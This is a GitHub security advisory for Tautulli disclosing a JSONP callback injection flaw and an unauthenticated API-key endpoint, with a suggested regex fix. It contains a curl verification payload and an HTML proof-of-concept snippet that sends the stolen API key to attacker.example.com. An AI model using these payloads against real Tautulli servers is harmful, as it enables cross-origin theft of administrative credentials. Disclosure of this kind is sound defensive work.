Unsanitized JSONP callback parameter allows cross-origin script injection and API key theft · Advisory · Tautulli/Tautulli · GitHub
[Skip to content](#start-of-content)
{{ message }}
[
Tautulli
](/Tautulli)
/
**
[Tautulli](/Tautulli/Tautulli)
**
Public
*
* [ Notifications
](/login?return_to=/Tautulli/Tautulli) You must be signed in to change notification settings
* [ Fork
623
](/login?return_to=/Tautulli/Tautulli)
*
[
Star
6.5k
](/login?return_to=/Tautulli/Tautulli)
#
Unsanitized JSONP callback parameter allows cross-origin script injection and API key theft
High
[JonnyWong16](/JonnyWong16)
published
GHSA-95mg-wpqw-9qxh
Mar 28, 2026
## Package
No package listed
## Affected versions
\>v1.3.10
## Patched versions
2.16.2
## Description
## Description
`plexpy/api2.py` line 696 concatenates the callback query parameter directly into an application/javascript response with no validation or sanitization:
```
# api2.py:693-696
if self.\_api\_callback is not None:
cherrypy.response.headers['Content-Type'] = 'application/javascript'
out = self.\_api\_callback + '(' + out + ');'
```
Three API commands (get\_apikey, docs, and docs\_md) bypass API key authentication entirely (`api2.py:145`), making them reachable without any credentials:
```
` elif not self.\_api\_authenticated and self.\_api\_cmd in ('get\_apikey', 'docs', 'docs\_md'):
self.\_api\_authenticated = True
`
```
This produces two exploitable impacts:
### Impact A: Arbitrary JavaScript injection (all installs)
Any URL of the form:
`GET /api/v2?cmd=docs&callback=\<payload\>` returns a `Content-Type: application/javascript` response whose body begins with the unsanitized payload. When loaded as a `\<script src\>` by an attacker-controlled page, the injected code executes in the victim's browser.
Verification:
```
` curl -si 'http://TAUTULLI:8181/api/v2?cmd=docs&callback=alert(1)//' \\
| grep -E 'Content-Type|^alert'
# Content-Type: application/javascript
# alert(1)//({"response": ...
`
```
### Impact B: Cross-origin API key theft (unauthenticated installs only)
When no HTTP password is configured, get\_apikey returns the API key to any caller. An attacker-controlled page can steal it cross-origin by naming the JSONP callback after a function it defines:
```
` \<script\>
window.steal = function(r) {
new Image().src = 'https://attacker.example.com/?k=' + r.response.data;
};
\</script\>
\<script src="http://TAUTULLI:8181/api/v2?cmd=get\_apikey&callback=steal"\>\</script\>
`
```
The browser executes the JSONP response as a script, calling `steal()` with the full API key, which is then exfiltrated. Possession of the API key grants full administrative access to the Tautulli API.
A self-contained browser PoC demonstrating both impacts is attached: [poc\_jsonp.html](https://github.com/user-attachments/files/25691852/poc_jsonp.html)
Tested against Docker with initialization command:
```
`docker run -d \\
--name=tautulli \\
--restart=unless-stopped \\
-v ./config:/config \\
-e PUID=1000 \\
-e PGID=1000 \\
-e TZ=America/Indiana/Indianapolis \\
-p 8181:8181 \\
ghcr.io/tautulli/tautulli
`
```
HTML PoC assumes Tautulli is running locally. It can be modified to a remote host for testing. A live attacker may use a list of IPs, hostnames, or other techniques to identify an internal server at run-time, but this demonstrates how a drive-by attack *could* appear.
## Suggested Fix
Validate the callback parameter against a strict allowlist of identifier characters before use. Per RFC 4329 and common JSONP hardening practice:
```
import re
\_JSONP\_CALLBACK\_RE = re.compile(r'^[a-zA-Z\_$][a-zA-Z0-9\_$.]\*$')
if self.\_api\_callback is not None:
if not \_JSONP\_CALLBACK\_RE.match(self.\_api\_callback):
# reject or sanitize
raise cherrypy.HTTPError(400, 'Invalid callback identifier')
cherrypy.response.headers['Content-Type'] = 'application/javascript'
out = self.\_api\_callback + '(' + out + ');'
```
### Severity
High
### CVE ID
CVE-2026-32275
### Weaknesses
Weakness
CWE-79
####
[Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](/advisories?query=cwe:79)
The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.
[Learn more on MITRE.](https://cwe.mitre.org/data/definitions/79.html)
### Credits
* [](/mandreko)[
mandreko](/mandreko)
Reporter